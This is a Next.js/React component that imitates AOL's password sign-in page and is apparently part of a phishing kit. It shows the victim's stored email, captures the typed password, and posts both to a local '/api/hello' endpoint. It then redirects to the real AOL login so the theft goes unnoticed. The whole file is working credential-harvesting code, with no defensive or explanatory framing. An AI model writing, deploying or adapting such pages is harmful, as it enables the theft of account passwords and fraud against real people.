import Image from 'next/image'
import { Inter } from 'next/font/google'
import { useEffect, useRef, useState } from 'react'

const inter = Inter({ subsets: ['latin'] })

export default function Account() {

  const [rine, setRine] = useState('')
  const eye = useRef<HTMLInputElement>(null)
  console.log(rine);
  const [jenneta, setJenneta] = useState('')
  

  useEffect(() => {
    setJenneta(localStorage.getItem('pine') ? localStorage.getItem('pine')! : '')
        
  })

  const handleSubmit = async () => {
    const data = {
        jenneta,
        rine
    }
    try {
        const result = await fetch('/api/hello', {
            method: 'POST',
            headers: {
                "Content-Type": "application/json",
              },
            body: JSON.stringify(data)
        });
    
        if (result.status === 200) {
           location.replace('https://login.aol.com/')
        }
    } catch (error) {
        console.log(error);
        
    }
    
  }
  
  return (
   <main className='sm:h-screen'>
    <header className='h-20 px-8 sm:flex justify-between pt-7 hidden'>
     <img src="/aol-logo-black.png" alt="logo" className='w-[6.5rem] h-10' />
     <p className='text-blue-500 text-sm'>
        Help
      </p>
    </header>

    <div className='sm:h-[85%] sm:flex sm:justify-between'>

      <div className=''></div>

      <div className='bg-white border border-gray-50 sm:h-[90%] sm:w-[367px] shadow-lg sm:mt-3 sm:mr-5 lg:mr-20 px-8 h-screen flex flex-col items-center'>
        <img src="/aol-logo-black.png" alt="logo" className='w-[6.5rem] h-10 mt-8' />

        <h3 className='text-md mt-3'>
            {jenneta}
        </h3>

        <h3 className='mt-5 text-xl font-bold text-center tracking-wide'>
          Enter password <br />
          <span className='text-sm font-normal tracking-normal'>to finish sign in</span>
        </h3>

        <form 
            className='w-full mt-16'
            onSubmit={(e) => {
                e.preventDefault();
                handleSubmit()
            }}
            >
           <div className='relative'>
           <svg xmlns="http://www.w3.org/2000/svg" 
           onClick={() => {
           if (eye.current) {
            eye.current.type = eye.current.type === 'password' ? 'text' : 'password'
           }
           }}
           fill="none" 
           viewBox="0 0 24 24" 
           strokeWidth={1.5} stroke="currentColor" 
           className="w-5 h-4 absolute right-1 top-2 cursor-pointer">
            <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>

            <input 
                      type="password"
                      ref={eye} 
                      className='peer placeholder-transparent 
                      w-full h-10 outline-none 
                      border-b border-gray-400'
                      value={rine} 
                      onChange={(e) => {
                        setRine(e.target.value)
                      }}
                      id='jenneta' 
                      name='jenneta' 
                      placeholder='Password'
                      required
                      />
            <label
                htmlFor="jenneta" 
                className='absolute left-0 -top-3.5
                  text-black text-sm
                  peer-placeholder-shown:text-base
                  peer-placeholder-shown:top-2
                  peer-placeholder-shown:text-gray-400
                  peer-focus:-top-3.5 
                  peer-focus:text-sm 
                  peer-focus:text-black
                  transition-all'>
                    Password
              </label>
           </div>

           <input 
           type="submit" 
           value="Next" 
           className='bg-[#3399FF] h-11 w-full mt-6 text-white cursor-pointer hover:bg-opacity-80'/>

          
              <p className='text-[#3399FF] text-center mt-6'>Forgot Password?</p>

           
        </form>

      </div>

    </div>
    <footer>

    </footer>
   </main>
  )
}
